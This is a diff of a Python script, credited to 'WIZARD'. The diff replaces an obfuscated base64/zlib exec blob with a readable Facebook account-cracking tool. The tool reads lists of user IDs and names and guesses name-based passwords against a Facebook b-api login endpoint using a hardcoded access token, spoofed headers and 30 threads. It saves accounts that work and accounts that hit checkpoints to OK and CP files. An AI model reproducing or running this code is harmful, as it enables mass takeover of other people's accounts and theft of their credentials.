@@ -1,7 +1,248 @@
-#Encrypted By WIZARD SMIX
+#!/usr/bin/python3
+#Written by WIZARD
+import requests,bs4,json,os,sys,random,datetime,time,re
+try:
+	import rich
+except ImportError:
+	os.system('pip install rich')
+	time.sleep(1)
+	try:
+		import rich
+	except ImportError:
+		exit('[✓] Internet Eror ,Install Manual (pip install rich)')
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as parser
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+try:ugen = open('user.txt','r').read().splitlines()
+except:ugen = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'] #WIZARD
+try:ugen2 = open('user2.txt','r').read().splitlines()
+except:ugen2 = ['Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'] #WIZARD
 
-#WHATSAPP : 0701763164/DON,T TRY TO EDIT THIS TOOL/
+id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 
-import zlib, base64
+x = '\033[93m'
+k = '\033[93m'
+h = '\x1b[1;92m'
+hh = '\033[92m'
+u = '\033[95m'
+kk = '\033[93m'
+b = '\33[1;96m'
+p = '\x1b[1;95m'
+P = '\033[0;00m'
+J = '\033[1;93m'
+S = '\033[0;00m'
+N = '\x1b[0m'
+I ='\033[1;92m'
+C ='\033[1;96m'
+M ='\033[1;91m'
+U ='\033[1;95m'
+K ='\033[1;93m'
+P='\033[00m'
+h='\033[1;90m'
+Q="\033[00m"
+kk='\033[1;92m'
+ff='\033[1;96m'
+G='\033[1;96m'
+p='\033[00m'
+h='\033[1;90m'
+Q="\033[00m"
+I='\033[1;92m'
+II='\033[1;96m'
+m='\033[1;91m'
+O ='\033[1;93m'
+H='\033[1;93m'
+b = '\033[1;96m'
+war = "[•]"
+B = random.choice([U,I,K,b,M])
 
-exec(zlib.decompress(base64.b64decode("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")))
+dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
+dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
+tgl = datetime.datetime.now().day
+bln = dic[(str(datetime.datetime.now().month))]
+thn = datetime.datetime.now().year
+okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
+
+my_id = '100007061760822'
+
+def jalan(z):
+    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
+def mlaku(z):
+    for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.03)
+    
+def clear():
+	os.system('clear')
+def back():
+	menu()
+def banner():
+	clear()
+	print("""%s\n\x1b[93;1m
+
+
+ _    _ _____ ______  ___  ____________ 
+| |  | |_   _|___  / / _ \ | ___ \  _  \
+| |  | | | |    / / / /_\ \| |_/ / | | |
+| |/\| | | |   / /  |  _  ||    /| | | |
+\  /\  /_| |_./ /___| | | || |\ \| |/ / 
+ \/  \/ \___/\_____/\_| |_/\_| \_|___/  
+\x1b[92;1m===================================>\x1b[92;1m
+\x1b[93;1m Authur       \x1b[92;1m=>         \x1b[93;1mWIZARD
+\x1b[93;1m Whatsp       \x1b[92;1m=>        \x1b[93;1m0701######
+\x1b[93;1m Github       \x1b[92;1m=>         \x1b[93;1
+\x1b[92;1m===================================>\x1b[92;1m
+"""%(h))
+		
+def menu(): #WIZARD
+	banner()
+	print("") #WIZARD
+	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
+	print("""%s \33[1;33m[1] File Crack  """%(h))
+	print("""%s \33[1;33m[0] Exit"""%(h))
+	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
+	farhan = input(x+'\33[1;96m•Input Number> ')
+	if farhan in ['1','01']:
+		File2()
+	elif farhan in ['0','00']:
+		os.system("xdg-open https://youtube.com/channel/UCvBJnicuI7RAtPtsthkWT9Q")
+		exit()
+	else:
+		os.system("https://youtube.com/channel/UCvBJnicuI7RAtPtsthkWT9Q")
+		exit()
+
+def File2():
+			clear()
+			banner()
+			try:
+				fileX = input ('\n [+] Enter file path : ') 
+				for line in open(fileX, 'r').readlines():
+					id.append(line.strip())
+				setting()
+			except IOError:
+				exit("\n [!] file %s not found"%(fileX))
+
+def setting():
+	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
+	print("""%s \33[1;33m[01] Farward Cracking """%(h))
+	print("""%s \33[1;33m[02] Reverse Cracking """%(h))
+	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
+	mubashar = input(x+'\33[1;96m•Input Number>')
+	if mubashar in ['1','01']:
+		for bacot in id:
+			id2.append(bacot)
+	elif mubashar in ['2','02']:
+		for bacot in id:
+			id2.insert(0,bacot)
+	
+	else:
+		print("""%s \33[1;33mRoung Input"""%(h))
+		exit()
+	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
+	print("""%s \33[1;33m[01] B-Api (fast)"""%(h))
+	print("""%s \x1b[92;1m<===================================>\x1b[92;1m """%(h))
+	baloch = input(x+'\33[1;96m•Input Number> : ')
+	if baloch in ['1','01']:
+		method.append('api')
+	else:
+		method.append('api')
+	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
+	fast = input(x+'\33[1;96m Want To Start ? (y/t) : ')
+	if fast in ['y','Y']:
+		passwrd()
+	elif fast in ['t','T']:
+		os.system("xdg-open https://youtube.com/channel/UCvBJnicuI7RAtPtsthkWT9Q")
+		exit()
+
+def passwrd():
+	clear()
+	banner()
+	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
+	print(x+' '+h+' '+x+' Total ids : '+str(len(id)))
+	print(x+'   [  IF NO RESULT USE AIRPLANE MODE  ]\n   Cracking Starting...')
+	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = []
+			if len(nmf)<6:
+				if len(frs)<3:
+					pass
+				else:
+					pwv.append(nmf)
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+			if 'api' in method:
+				pool.submit(crack2,idf,pwv)
+			else:
+				pool.submit(crack2,idf,pwv)
+	print('')
+	print("""%s \x1b[92;1m===================================>\x1b[92;1m """%(h))
+	exitss = input(x+'\33[1;96m Want to Exit (y/t) : ')
+	if exitss in ['y','Y']:
+		exit()
+	else:
+		exit()
+
+def crack2(idf,pwv):
+	global loop,ok,cp
+	bi = random.choice([u,k,kk,b,h,hh])
+	pers = loop*100/len(id2)
+	fff = '%'
+	print('\r%s [WIZ] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
+	ua = random.choice(ugen).replace('\n','')
+	ses = requests.Session()
+	for pw in pwv:
+		try:
+			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
+			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
+			if "www.facebook.com" in resp.json()["error_msg"]:
+				if 'ya' in oprek:
+					akun.append(idf+'|'+pw)
+					ceker(idf,pw)
+				else:
+					print('\r%s [WIZ-CP] %s|%s        '%(b,idf,pw))
+					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+					akun.append(idf+'|'+pw)
+					cp+=1
+				break
+			elif "session_key" in resp.text and "EAAB" in resp.text:
+				print('\r%s [ok] %s|%s        '%(h,idf,pw))
+				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
+				ok+=1
+				break
+			else:
+				continue
+		except requests.exceptions.ConnectionError:
+			time.sleep(31)
+	loop+=1
+
+def jalan(z):
+    for e in z + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.04)
+def mlaku(z):
+    for e in z + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+if __name__=='__main__':
+	os.system('git pull')
+	try:os.mkdir('CP')
+	except:pass
+	try:os.mkdir('OK')
+	except:pass
+	os.system("xdg-open https://www.facebook.com/profile.php?id=100011355877620")
+	menu()
+	
